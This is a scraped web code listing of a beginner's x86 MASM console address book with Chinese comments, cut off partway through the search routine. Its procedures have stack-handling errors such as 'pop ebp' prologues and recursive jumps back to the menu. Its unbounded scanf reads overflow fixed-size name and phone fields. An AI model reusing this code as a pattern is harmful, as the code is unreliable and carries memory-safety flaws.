class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br></pre></td><td class="code"><pre><span class="line">.386;汇编语言的伪指令，再80386及以后的处理器中使用该指令集</span><br><span class="line">.model flat,stdcall;模式定义“model 内存模式【调用模式】”</span><br><span class="line">option casemap:none;选项设定（设定为对大小写敏感）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">include windows.inc</span><br><span class="line">include msvcrt.inc;包含c语言的库</span><br><span class="line">includelib msvcrt.lib;包含c语言库对应的lib文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.data </span><br><span class="line"></span><br><span class="line">;定义结构体</span><br><span class="line">CONTACTSSTRUCT struct</span><br><span class="line">szName BYTE 25 dup(0)</span><br><span class="line">szPhNumber BYTE 12 dup(0)</span><br><span class="line">CONTACTSSTRUCT ends</span><br><span class="line"></span><br><span class="line">PCONTACTSSTRUCT TYPEDEF PTR CONTACTSSTRUCT ;取别名（指针类型）</span><br><span class="line"></span><br><span class="line">;声明全局变量</span><br><span class="line">g_stConstacts CONTACTSSTRUCT 100 dup(&lt;&#39;0&#39;&gt;);定义结构体数组 </span><br><span class="line">g_nCount DWORD 0;元素个数 </span><br><span class="line">g_nCountMax DWORD 100;最大存放元素个数</span><br><span class="line">g_strTemContacts CONTACTSSTRUCT &lt;&#39;0&#39;,&#39;0&#39;&gt;;接收输入的信息</span><br><span class="line"></span><br><span class="line">;定义格式控制字符</span><br><span class="line">g_szScanfFormat BYTE &#39;%s %s&#39;,0</span><br><span class="line">g_szScanName BYTE &#39;%s&#39;,0</span><br><span class="line">Line db &quot; &quot;,0Ah,0</span><br><span class="line"></span><br><span class="line">;菜单数据</span><br><span class="line">MenuStaly db   &quot; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;,0Ah,0h</span><br><span class="line">MenuPage db    &quot;《    根据序号选择你要进行的操作      》&quot;,0Ah,0h</span><br><span class="line">MenuReadAll db &quot;《    --1---- 查看所有联系人 ----1-   》&quot;,0Ah,0h</span><br><span class="line">MenuAdd db     &quot;《    --2----   添加联系人   ----2-   》&quot;,0Ah,0h</span><br><span class="line">Menudel db     &quot;《    --3----   删除联系人   ----3-   》&quot;,0Ah,0h</span><br><span class="line">Menuchage db   &quot;《    --4----   修改联系人   ----4-   》&quot;,0Ah,0h</span><br><span class="line">MenuSeach db   &quot;《    --5----   搜索联系人   ----5-   》&quot;,0Ah,0h</span><br><span class="line">MenuSave db   &quot;《    --6----    保存改变    ----6-   》&quot;,0Ah,0h</span><br><span class="line">MenuExit db    &quot;《    --7----      退出      ----7-   》&quot;,0Ah,0h</span><br><span class="line">MenuNull db    &quot;《                                    》&quot;,0Ah,0h</span><br><span class="line">clean db &quot;cls&quot;,0h</span><br><span class="line"></span><br><span class="line">;菜单选择数据</span><br><span class="line">printPlease db &quot;请输入： &quot;,0h</span><br><span class="line">intFormat db &quot;%d&quot;,0h</span><br><span class="line">case byte 0</span><br><span class="line">printError db &quot;你的输入有误： &quot;,0Ah,0h</span><br><span class="line"></span><br><span class="line">;添加用户数据所用字符串</span><br><span class="line">g_szAddStr db &quot;请输入你所要保存的联系人&quot;,0Ah,0h</span><br><span class="line">g_szAddTpn db &quot;请输入你所要保存的电话号码&quot;,0Ah,0h</span><br><span class="line">g_szAddSuse db &quot;添加成功&quot;,0Ah,0h</span><br><span class="line">strPause db &quot;pause&quot;,0h</span><br><span class="line"></span><br><span class="line">;查询联系人所用数据</span><br><span class="line">g_szFindstr db &quot;请输入你所要查询的联系人&quot;,0Ah,0h</span><br><span class="line"></span><br><span class="line">;删除联系人所用数据</span><br><span class="line">g_szRemovepri db &quot;请输入你要删除的数据&quot;,0Ah,0h</span><br><span class="line">g_szRemovestr db &quot;请再次确认是否删除&quot;,0Ah,0h</span><br><span class="line"></span><br><span class="line">;修改数据所用</span><br><span class="line">g_szModifypri db &quot;请输入你要修改的数据&quot;,0Ah,0h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;文件操作所用数据</span><br><span class="line">filep db &quot;2L&quot;,0h</span><br><span class="line"></span><br><span class="line">wb db &quot;w+&quot;,0h</span><br><span class="line"></span><br><span class="line">rb db &quot;r+&quot;,0h</span><br><span class="line"></span><br><span class="line">FilePath db &quot;.\INFO.txt&quot;,0h</span><br><span class="line"></span><br><span class="line">;file dword ?</span><br><span class="line"></span><br><span class="line">Save db &quot;保存成功&quot;,0Ah,0h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;菜单界面</span><br><span class="line">MenuShell proc</span><br><span class="line">push offset clean</span><br><span class="line">call crt_system</span><br><span class="line">add esp,04h </span><br><span class="line">push offset MenuStaly</span><br><span class="line">call crt_printf </span><br><span class="line">push offset MenuPage</span><br><span class="line">call crt_printf </span><br><span class="line">add esp,8h</span><br><span class="line">push offset MenuNull</span><br><span class="line">call crt_printf</span><br><span class="line">push offset MenuNull</span><br><span class="line">call crt_printf </span><br><span class="line">add esp,8h</span><br><span class="line"></span><br><span class="line">push offset MenuReadAll </span><br><span class="line">call crt_printf</span><br><span class="line">push offset MenuAdd</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,8h</span><br><span class="line"></span><br><span class="line">push offset Menudel</span><br><span class="line">call crt_printf</span><br><span class="line">push offset Menuchage</span><br><span class="line">call crt_printf </span><br><span class="line">add esp,8h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push offset MenuSeach </span><br><span class="line">call crt_printf </span><br><span class="line">push offset MenuSave</span><br><span class="line">call crt_printf </span><br><span class="line">add esp,8h</span><br><span class="line"></span><br><span class="line">push offset MenuExit </span><br><span class="line">call crt_printf </span><br><span class="line">push offset MenuNull</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,8h</span><br><span class="line">push offset MenuNull</span><br><span class="line">call crt_printf </span><br><span class="line">push offset MenuStaly</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,08h</span><br><span class="line"></span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">MenuShell endp</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">;选择操作</span><br><span class="line">SwitchCase proc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line"></span><br><span class="line">push offset printPlease</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,04h</span><br><span class="line"></span><br><span class="line">push offset case;把接收的缓冲区压入栈</span><br><span class="line">push offset intFormat;把接收字符的变量压入栈</span><br><span class="line">call crt_scanf;调用接收字符的函数</span><br><span class="line">add esp,8h;弹出接收字符的变量</span><br><span class="line"></span><br><span class="line">push offset case</span><br><span class="line">mov al,[case]</span><br><span class="line">add esp,4</span><br><span class="line">cmp al,1h;1查看所有联系人</span><br><span class="line">jnz next2</span><br><span class="line">call LookAllData</span><br><span class="line">next2:</span><br><span class="line">cmp al,2h;2添加一个联系人</span><br><span class="line">jnz next3</span><br><span class="line">call ADD_USER</span><br><span class="line"></span><br><span class="line">next3:</span><br><span class="line"></span><br><span class="line">cmp al,3</span><br><span class="line">jnz next4</span><br><span class="line">call RemoveData;3删除一个联系人</span><br><span class="line">next4:</span><br><span class="line">cmp al,4</span><br><span class="line">jnz next5;4修改一个联系人</span><br><span class="line">call ModifyData</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">next5:</span><br><span class="line"></span><br><span class="line">cmp al,5;5搜索一个联系人</span><br><span class="line">jnz next6</span><br><span class="line">call FindData</span><br><span class="line">next6:</span><br><span class="line">cmp al,6</span><br><span class="line">jnz next7;保存</span><br><span class="line">call SaveData</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">next7:</span><br><span class="line">cmp al,7;7退出</span><br><span class="line">jz exit</span><br><span class="line">defaul:</span><br><span class="line">push offset printError;1-6的范围，其余报错，且返回主菜单</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,04h</span><br><span class="line">call MenuShell</span><br><span class="line">jmp start</span><br><span class="line">exit:</span><br><span class="line">ret</span><br><span class="line">SwitchCase endp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;查看所有</span><br><span class="line">LookAllData proc</span><br><span class="line">pop ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,050h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mov ecx,0h;初始化循环次数</span><br><span class="line"></span><br><span class="line">NEXT:</span><br><span class="line">push ecx</span><br><span class="line">cmp ecx,g_nCount;比较元素个数和0是否相等（循环完后即相等）</span><br><span class="line">jg EXIT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lea esi,[g_stConstacts];把保存信息的结构体的地址赋值给esi</span><br><span class="line">mov eax,sizeof(CONTACTSSTRUCT);计算结构体大小</span><br><span class="line">imul eax,ecx;把结构体大小乘以结构体个数（得到总大小，就是结构体尾部插入数据的偏移量）</span><br><span class="line">add esi,eax;把这个偏移量给esi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push offset Line</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,4</span><br><span class="line">lea ebx,[esi+CONTACTSSTRUCT.szName]</span><br><span class="line">push ebx;</span><br><span class="line">push offset g_szScanName;</span><br><span class="line">call crt_printf;</span><br><span class="line">add esp,08h</span><br><span class="line"></span><br><span class="line">push offset Line</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,4</span><br><span class="line">lea ebx,[esi+CONTACTSSTRUCT.szPhNumber];</span><br><span class="line">push ebx;</span><br><span class="line">push offset g_szScanName;</span><br><span class="line">call crt_printf;</span><br><span class="line">add esp,08h;</span><br><span class="line"></span><br><span class="line">pop ecx</span><br><span class="line">inc ecx;外循环次数加1</span><br><span class="line">jmp NEXT;继续外循环</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EXIT:</span><br><span class="line">push offset Line</span><br><span class="line">call crt_printf</span><br><span class="line">push offset strPause</span><br><span class="line">call crt_system</span><br><span class="line">add esp,8</span><br><span class="line">mov esp,ebp</span><br><span class="line">pop ebp</span><br><span class="line">call main;返回主菜单</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">LookAllData endp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;添加用户信息</span><br><span class="line">ADD_USER proc</span><br><span class="line">push eax</span><br><span class="line">push ebx;先保存原来寄存器的值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;根据ecx的值找到下一个结构体名字数组的地址</span><br><span class="line">lea esi,[g_stConstacts];保存结构体数组</span><br><span class="line">mov ecx,g_nCount;保存元素个数</span><br><span class="line">mov eax,sizeof(CONTACTSSTRUCT);计算结构体大小</span><br><span class="line">imul eax,ecx;当前个数乘与结构体大小，把结果放到eax中</span><br><span class="line">add esi,eax;之前的结构体数组的地址加上偏移量，等于下一个结构体的地址</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;调用crt_scanf函数接收输入的数据</span><br><span class="line">lea eax,g_szAddStr;lea表示取第二个操作数的地址放到第一个操作数中</span><br><span class="line">push eax</span><br><span class="line">call crt_printf;打印提示（字符串地址再eax中，使用lea保存到eax）</span><br><span class="line">;call crt_printf</span><br><span class="line">add esp,4h;平栈</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lea eax,[esi+CONTACTSSTRUCT.szName];把接收联系人的地址放到eax中</span><br><span class="line">push eax;把eax中存储的地址压到栈中</span><br><span class="line">push offset g_szScanName;压入一个输出控制符</span><br><span class="line">call crt_scanf;调用接收字符的c语言函数</span><br><span class="line">add esp,08h;平栈</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lea eax,g_szAddTpn;lea表示取第二个操作数的地址放到第一个操作数中</span><br><span class="line">push eax</span><br><span class="line">call crt_printf;打印提示（字符串地址再eax中，使用lea保存到eax）</span><br><span class="line">add esp,4h;平栈</span><br><span class="line">lea edx,[esi+CONTACTSSTRUCT.szPhNumber];把接收电话号码的地址放到ebx中</span><br><span class="line">push edx;把eax中存储的地址压到栈中</span><br><span class="line">push offset g_szScanName;压入一个输出控制符</span><br><span class="line">call crt_scanf;调用接收字符的c语言函数</span><br><span class="line">add esp,08h;平栈</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push offset g_szAddSuse;添加成功字符串压入栈</span><br><span class="line">call crt_printf;再控制台打印</span><br><span class="line">add esp,04h;平栈</span><br><span class="line"></span><br><span class="line">inc g_nCount;元素个数自增1</span><br><span class="line"></span><br><span class="line">push offset strPause</span><br><span class="line">call crt_system</span><br><span class="line">add esp,04h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop eax;把之前保存的寄存器弹出</span><br><span class="line">pop ebx;</span><br><span class="line">call SwitchCase</span><br><span class="line"></span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">ADD_USER endp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;查询用户信息</span><br><span class="line">FindData proc</span><br><span class="line">pop ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,050h</span><br><span class="line"></span><br><span class="line">;输入要查询的数据</span><br><span class="line">lea eax,g_szFindstr</span><br><span class="line">push eax</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,04h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lea edi,[g_strTemContacts.szName];把结构体中名字的地址赋值给edi</span><br><span class="line">push edi;把名字的地址压入栈</span><br><span class="line">push offset g_szScanName;格式控制符</span><br><span class="line">call crt_scanf;调用接收字符的c语言函数</span><br><span class="line">add esp,08h;平栈</span><br><span class="line">push edi</span><br><span class="line">call crt_strlen</span><br><span class="line">pop edi</span><br><span class="line">mov [ebp-8],eax</span><br><span class="line"></span><br><span class="line">;根据输入的名字查询</span><br><span class="line">mov ecx,0h;初始化循环次数</span><br><span class="line">NEXT:</span><br><span class="line">cmp ecx,g_nCount;比较元素个数和0是否相等（循环完后即相等）</span><br><span class="line">jge EXIT</span><br><span class="line"></span><br><span class="line">lea edi,[g_strTemContacts.szName];把结构体名字的地址赋值给edi</span><br><span class="line"></span><br><span class="line">lea esi,[g_stConstacts.szName];把保存信息的结构体的地址赋值给esi</span><br><span class="line">mov eax,sizeof(CONTACTSSTRUCT);计算结构体大小</span><br><span class="line">imul eax,ecx;把结构体大小乘以结构体个数（得到总大小，就是结构体尾部插入数据的偏移量）</span><br><span class="line">add esi,eax;把这个偏移量给esi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;比较字符串</span><br><span class="line">mov eax,ecx;把循环次数给eax（元素个数）</span><br><span class="line">mov ecx,[ebp-8];初始化</span><br><span class="line">repe cmpsb BYTE ptr [esi], BYTE ptr[edi];esi存储的是结构体里的用户信息，edi是输入的信息，将这两个信息循环比较</span><br><span class="line">jz PRINTFINFO;如果相等就跳转（找到了）</span><br><span class="line">mov ecx,eax;把外循环次数还给ecx</span><br><span class="line">inc ecx;外循环次数加1</span><br><span class="line">jmp NEXT;继续外循环</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;--------------------------------------------------------------------------------------------</span><br><span class="line">;push esi</span><br><span class="line">;push edi;</span><br><span class="line">;call crt_strcmp</span><br><span class="line">;jz PRINTFINFO</span><br><span class="line">;add esp,8h </span><br><span class="line">;mov ecx,eax</span><br><span class="line">;inc ecx</span><br><span class="line">;jmp NEXT</span><br><span class="line"></span><br><span class="line">PRINTFINFO:</span><br><span class="line">;输出查询结果</span><br><span class="line">;add esp,8h </span><br><span class="line">mov ecx,eax;循环</span><br><span class="line">lea esi,[g_stConstacts]</span><br><span class="line">mov ebx,sizeof(CONTACTSSTRUCT);计算结构体大小</span><br><span class="line">imul ebx,ecx;把结构体大小乘以结构体个数（得到总大小，就是结构体尾部插入数据的偏移量）</span><br><span class="line">add esi,ebx;把这个偏移量给esi(eax保存的是循环到底几次后找到的)</span><br><span class="line">;mov [ebp-12],esi</span><br><span class="line">lea ebx,[esi+CONTACTSSTRUCT.szName];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push ebx;</span><br><span class="line">push offset g_szScanName;</span><br><span class="line">call crt_printf;</span><br><span class="line">add esp,08h;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lea eax,[esi+CONTACTSSTRUCT.szPhNumber];</span><br><span class="line">push eax;</span><br><span class="line">push offset g_szScanName;</span><br><span class="line">call crt_printf;</span><br><span class="line">add esp,08h;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push offset strPause</span><br><span class="line">call crt_system</span><br><span class="line">add esp,04h </span><br><span class="line">;call crt_getchar;</span><br><span class="line">;call crt_getchar;</span><br><span class="line">EXIT:</span><br><span class="line"></span><br><span class="line">mov 